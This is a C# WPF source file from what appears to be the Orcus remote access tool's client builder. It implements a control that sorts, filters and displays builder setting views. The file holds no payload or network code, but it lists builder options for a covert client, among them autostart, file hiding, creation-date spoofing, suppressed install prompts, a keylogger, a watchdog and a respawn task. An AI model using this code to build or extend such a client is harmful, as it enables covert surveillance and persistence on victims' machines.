using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Collections.Specialized;
using System.Linq;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.ViewModels.ClientBuilder;
using Orcus.Administration.Views.BuilderViews;
using Orcus.Plugins.Builder;
using Orcus.Plugins.ClientPlugin;

namespace Orcus.Administration.Controls.Builder
{
    public class BuilderPropertiesItemsControl : ItemsControl, IComparer
    {
        public static readonly DependencyProperty BuilderPropertiesProperty = DependencyProperty.Register(
            "BuilderProperties", typeof (ObservableCollection<BuilderPropertyViewModel>),
            typeof (BuilderPropertiesItemsControl),
            new PropertyMetadata(default(ObservableCollection<BuilderPropertyViewModel>),
                BuilderPropertiesPropertyChangedCallback));

        public static readonly DependencyProperty BuilderCategoryProperty = DependencyProperty.Register(
            "BuilderCategory", typeof (BuilderCategory), typeof (BuilderPropertiesItemsControl),
            new PropertyMetadata(default(BuilderCategory)));

        public static readonly DependencyProperty BuilderGroupProperty = DependencyProperty.Register(
            "BuilderGroup", typeof (BuilderGroup), typeof (BuilderPropertiesItemsControl),
            new PropertyMetadata(default(BuilderGroup)));

        public static readonly DependencyProperty BuilderInfoProperty = DependencyProperty.Register(
            "BuilderInfo", typeof (IBuilderInfo), typeof (BuilderPropertiesItemsControl),
            new PropertyMetadata(default(IBuilderInfo)));

        public static readonly DependencyProperty CachedBuilderPropertyViewsProperty = DependencyProperty
            .RegisterAttached(
                "CachedBuilderPropertyViews", typeof (List<IBuilderPropertyView>),
                typeof (BuilderPropertiesItemsControl), new PropertyMetadata(default(List<IBuilderPropertyView>)));

        private ObservableCollection<BuilderPropertyViewModel> _builderProperties;

        public BuilderPropertiesItemsControl()
        {
            BuilderPropertyViews = new Lazy<Dictionary<Type, IBuilderPropertyView>>(() =>
            {
                var window = Window.GetWindow(this);
                var builderPropertyViews = GetCachedBuilderPropertyViews(window);
                if (builderPropertyViews == null)
                {
                    builderPropertyViews = new List<IBuilderPropertyView>(GetBuilderPropertyViews());
                    SetCachedBuilderPropertyViews(window, builderPropertyViews);
                }

                return
                    new Dictionary<Type, IBuilderPropertyView>(
                        builderPropertyViews.ToDictionary(x => x.BuilderProperty, y => y));
            });
        }

        public IBuilderInfo BuilderInfo
        {
            get { return (IBuilderInfo) GetValue(BuilderInfoProperty); }
            set { SetValue(BuilderInfoProperty, value); }
        }

        public Lazy<Dictionary<Type, IBuilderPropertyView>> BuilderPropertyViews { get; }

        public BuilderGroup BuilderGroup
        {
            get { return (BuilderGroup) GetValue(BuilderGroupProperty); }
            set { SetValue(BuilderGroupProperty, value); }
        }

        public BuilderCategory BuilderCategory
        {
            get { return (BuilderCategory) GetValue(BuilderCategoryProperty); }
            set { SetValue(BuilderCategoryProperty, value); }
        }

        public ObservableCollection<BuilderPropertyViewModel> BuilderProperties
        {
            get { return (ObservableCollection<BuilderPropertyViewModel>) GetValue(BuilderPropertiesProperty); }
            set { SetValue(BuilderPropertiesProperty, value); }
        }

        public int Compare(object x, object y)
        {
            var builderProperty1 = (BuilderPropertyViewModel) x;
            var builderProperty2 = (BuilderPropertyViewModel) y;

            var builderPropertyView1 = BuilderPropertyViews.Value[builderProperty1.BuilderProperty.GetType()];
            var builderPropertyView2 = BuilderPropertyViews.Value[builderProperty2.BuilderProperty.GetType()];

            if (builderPropertyView1.PropertyPosition.BuilderCategory !=
                builderPropertyView2.PropertyPosition.BuilderCategory)
                return 0;


            if (builderPropertyView1.PropertyPosition.BuilderPropertyIndex == null &&
                builderPropertyView2.PropertyPosition.BuilderPropertyIndex == null)
            {
                return
                    _builderProperties.IndexOf(builderProperty1)
                        .CompareTo(_builderProperties.IndexOf(builderProperty2));
            }

            var propertyRoot1 = builderPropertyView1;
            var propertyRoot2 = builderPropertyView2;

            if (builderPropertyView1.PropertyPosition.BuilderPropertyIndex != null)
                propertyRoot1 = FindRoot(builderPropertyView1);

            if (builderPropertyView2.PropertyPosition.BuilderPropertyIndex != null)
                propertyRoot2 = FindRoot(builderPropertyView2);

            if (propertyRoot1 != propertyRoot2)
            {
                var rootProperty1 = _builderProperties.First(o => o.BuilderProperty.GetType() == propertyRoot1.BuilderProperty);
                var rootProperty2 = _builderProperties.First(o => o.BuilderProperty.GetType() == propertyRoot2.BuilderProperty);
                return
                    _builderProperties.IndexOf(rootProperty1)
                        .CompareTo(_builderProperties.IndexOf(rootProperty2));
            }

            if (builderPropertyView1.PropertyPosition.BuilderPropertyIndex?.PreviousBuilderProperty ==
                builderPropertyView2.PropertyPosition.BuilderPropertyIndex?.PreviousBuilderProperty)
            {
                if (_builderProperties.IndexOf(builderProperty1) > _builderProperties.IndexOf(builderProperty2))
                    return -1;
                else
                    return 1;
            }

            //loop backwards through the collection. if the second element isnt found, it must come afterwards, else it comes before it
            var currentPropertyView = builderPropertyView1;
            while (true)
            {
                if (currentPropertyView.PropertyPosition.BuilderPropertyIndex == null)
                    return -1;

                currentPropertyView = GetPreviousBuilderPropertyView(currentPropertyView);

                if (currentPropertyView == builderPropertyView2)
                    return 1;
            }
        }

        public static void SetCachedBuilderPropertyViews(DependencyObject element, List<IBuilderPropertyView> value)
        {
            element.SetValue(CachedBuilderPropertyViewsProperty, value);
        }

        public static List<IBuilderPropertyView> GetCachedBuilderPropertyViews(DependencyObject element)
        {
            return (List<IBuilderPropertyView>) element.GetValue(CachedBuilderPropertyViewsProperty);
        }

        private static void BuilderPropertiesPropertyChangedCallback(DependencyObject dependencyObject,
            DependencyPropertyChangedEventArgs dependencyPropertyChangedEventArgs)
        {
            var builderPropertiesItemsControl = (BuilderPropertiesItemsControl) dependencyObject;
            builderPropertiesItemsControl.InitializeBuilderProperties(
                dependencyPropertyChangedEventArgs.NewValue as ObservableCollection<BuilderPropertyViewModel>,
                dependencyPropertyChangedEventArgs.OldValue as ObservableCollection<BuilderPropertyViewModel>);
        }

        private void InitializeBuilderProperties(ObservableCollection<BuilderPropertyViewModel> builderProperties,
            ObservableCollection<BuilderPropertyViewModel> oldBuilderProperties)
        {
            _builderProperties = builderProperties;

            if (oldBuilderProperties != null)
                oldBuilderProperties.CollectionChanged -= BuilderPropertiesOnCollectionChanged;

            if (builderProperties == null)
            {
                ItemsSource = null;
                return;
            }

            foreach (var builderPropertyViewModel in builderProperties)
                builderPropertyViewModel.BuilderPropertyView =
                    BuilderPropertyViews.Value[builderPropertyViewModel.BuilderProperty.GetType()];

            builderProperties.CollectionChanged += BuilderPropertiesOnCollectionChanged;

            var listCollectionView = (ListCollectionView) new CollectionViewSource {Source = builderProperties}.View;
            listCollectionView.Filter = Filter;
            listCollectionView.CustomSort = this;
            ItemsSource = listCollectionView;
        }

        private void BuilderPropertiesOnCollectionChanged(object sender,
            NotifyCollectionChangedEventArgs notifyCollectionChangedEventArgs)
        {
            if (notifyCollectionChangedEventArgs.NewItems == null)
                return;

            foreach (
                var builderPropertyViewModel in
                    notifyCollectionChangedEventArgs.NewItems.Cast<BuilderPropertyViewModel>())
                builderPropertyViewModel.BuilderPropertyView =
                    BuilderPropertyViews.Value[builderPropertyViewModel.BuilderProperty.GetType()];
        }

        private bool Filter(object o)
        {
            var builderProepertyViewModel = (BuilderPropertyViewModel) o;
            var propertyView = BuilderPropertyViews.Value[builderProepertyViewModel.BuilderProperty.GetType()];
            return propertyView.PropertyPosition.BuilderCategory == BuilderCategory &&
                   propertyView.PropertyPosition.BuilderGroup == BuilderGroup &&
                   !propertyView.PropertyPosition.IsGroupLeader;
        }

        private IBuilderPropertyView FindRoot(IBuilderPropertyView builderPropertyView)
        {
            var rootBuilderPropertyView = builderPropertyView;
            while (true)
            {
                if (rootBuilderPropertyView.PropertyPosition.BuilderPropertyIndex == null)
                    return rootBuilderPropertyView;

                rootBuilderPropertyView = GetPreviousBuilderPropertyView(rootBuilderPropertyView);
            }
        }

        private IBuilderPropertyView GetPreviousBuilderPropertyView(IBuilderPropertyView builderPropertyView)
        {
            if (builderPropertyView.PropertyPosition.BuilderPropertyIndex != BuilderPropertyIndex.None)
            {
                var previousBuilderPropertyView =
                    BuilderPropertyViews.Value.Select(x => x.Value).FirstOrDefault(
                        x =>
                            x.BuilderProperty ==
                            builderPropertyView.PropertyPosition.BuilderPropertyIndex.PreviousBuilderProperty);

                if (previousBuilderPropertyView != null)
                    return previousBuilderPropertyView;
            }

            var builderPropertyIndex =
                _builderProperties.IndexOf(
                    _builderProperties.First(x => x.GetType() == builderPropertyView.BuilderProperty));

            // if (builderPropertyIndex == 0)
            //    return null;

            for (int i = builderPropertyIndex - 1; i >= 0; i--)
            {
                var propertyView = BuilderPropertyViews.Value[_builderProperties[i].GetType()];
                if (propertyView.PropertyPosition.BuilderPropertyIndex == null)
                    return propertyView;
            }

            return null;
        }

        protected override bool IsItemItsOwnContainerOverride(object item)
        {
            return false;
        }

        protected override DependencyObject GetContainerForItemOverride()
        {
            return new BuilderPropertyViewContainer(BuilderPropertyViews.Value, BuilderInfo);
        }

        private static IEnumerable<IBuilderPropertyView> GetBuilderPropertyViews()
        {
            yield return new AutostartBuilderPropertyView();
            yield return new ChangeAssemblyInformationBuilderPropertyView();
            yield return new ChangeCreationDateBuilderPropertyView();
            yield return new ChangeIconBuilderPropertyView();
            yield return new ClientTagBuilderPropertyView();
            yield return new ConnectionBuilderPropertyView();
            yield return new DataFolderBuilderPropertyView();
            yield return new DefaultPrivilegesBuilderPropertyView();
            yield return new DisableInstallationPromptBuilderPropertyView();
            yield return new FrameworkVersionBuilderPropertyView();
            yield return new HideFileBuilderPropertyView();
            yield return new InstallationLocationBuilderPropertyView();
            yield return new InstallBuilderPropertyView();
            yield return new KeyloggerBuilderPropertyView();
            yield return new MutexBuilderPropertyView();
            yield return new ProxyBuilderPropertyView();
            yield return new ReconnectDelayBuilderPropertyView();
            yield return new RequireAdministratorPrivilegesInstallerBuilderPropertyView();
            yield return new RespawnTaskBuilderPropertyView();
            yield return new ServiceBuilderPropertyView();
            yield return new SetRunProgramAsAdminFlagBuilderPropertyView();
            yield return new WatchdogBuilderPropertyView();

            foreach (var result in PluginManager.Current.LoadedPlugins.OfType<BuildPlugin>())
            {
                var provideBuilderSettings = result.Plugin as IProvideBuilderSettings;
                if (provideBuilderSettings != null)
                    foreach (var builderPropertyEntry in provideBuilderSettings.BuilderSettings)
                        yield return builderPropertyEntry.BuilderPropertyView;
            }
            foreach (var result in PluginManager.Current.LoadedPlugins.OfType<ClientPlugin>())
            {
                var provideBuilderSettings = result.Plugin as ClientControllerBuilderSettings;
                if (provideBuilderSettings != null)
                    foreach (var builderPropertyEntry in provideBuilderSettings.BuilderSettings)
                        yield return builderPropertyEntry.BuilderPropertyView;
            }
        }

        public class BuilderPropertyViewContainer : ContentPresenter
        {
            private readonly IBuilderInfo _builderInfo;
            private readonly Dictionary<Type, IBuilderPropertyView> _builderPropertyViews;

            public BuilderPropertyViewContainer(Dictionary<Type, IBuilderPropertyView> builderPropertyViews,
                IBuilderInfo builderInfo)
            {
                _builderPropertyViews = builderPropertyViews;
                _builderInfo = builderInfo;
                DataContextChanged += OnDataContextChanged;
            }

            private void OnDataContextChanged(object sender,
                DependencyPropertyChangedEventArgs dependencyPropertyChangedEventArgs)
            {
                var builderProperty = dependencyPropertyChangedEventArgs.NewValue as BuilderPropertyViewModel;
                if (builderProperty == null)
                    return;

                var view = _builderPropertyViews[builderProperty.BuilderProperty.GetType()];

                var requestingBuilderInfo = view as IRequestBuilderInfo;
                if (requestingBuilderInfo != null)
                    requestingBuilderInfo.BuilderInfo = _builderInfo;

                var frameworkElement = view as FrameworkElement;
                if (frameworkElement != null)
                {
                    frameworkElement.SetValue(DataContextProperty, builderProperty.BuilderProperty);
                    frameworkElement.SetBinding(IsEnabledProperty, new Binding("IsEnabled") {Source = builderProperty});
                }

                var stackPanel = new StackPanel();
                stackPanel.Children.Add(new ContentPresenter {Content = view});

                var builderErrorControl = new BuilderErrorControl
                {
                    DataContext = builderProperty,
                    Margin = new Thickness(0, 2, 0, 0)
                };
                stackPanel.Children.Add(builderErrorControl);

                Content = stackPanel;
            }
        }
    }
}